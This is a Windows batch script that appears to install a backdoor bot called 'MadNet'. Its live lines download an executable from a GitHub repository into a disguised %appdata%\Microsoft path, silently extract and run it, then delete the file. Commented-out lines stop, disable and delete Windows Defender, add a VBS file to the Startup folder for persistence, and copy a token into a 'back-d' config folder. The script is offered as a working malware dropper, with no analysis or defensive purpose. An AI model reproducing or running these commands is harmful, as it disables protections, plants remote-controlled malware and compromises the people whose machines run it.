@echo off

@REM net stop WinDefend
@REM sc config WinDefend start= disabled
@REM del /f /s /q "%ProgramFiles%\Windows Defender"
@REM del /f /s /q "%ProgramData%\Microsoft\Windows Defender"

@REM set /p Token_Num="Token: "

powershell -Command "Invoke-WebRequest https://github.com/DmodvGH/MadNet/raw/main/bot/madnet.exe -OutFile %appdata%\Microsoft\madnet.exe"

@REM start %appdata%\Microsoft\Windows\windows_shell.exe

@REM powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/bot/invis.vbs -OutFile 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Windows.vbs'"
powershell -Command "%appdata%\Microsoft\madnet.exe -e -aoa -y"
del %appdata%\microsoft\madnet.exe
@REM copy ".\token\%Token_Num%" "%appdata%\Microsoft\Windows\back-d\config"

pause > nul
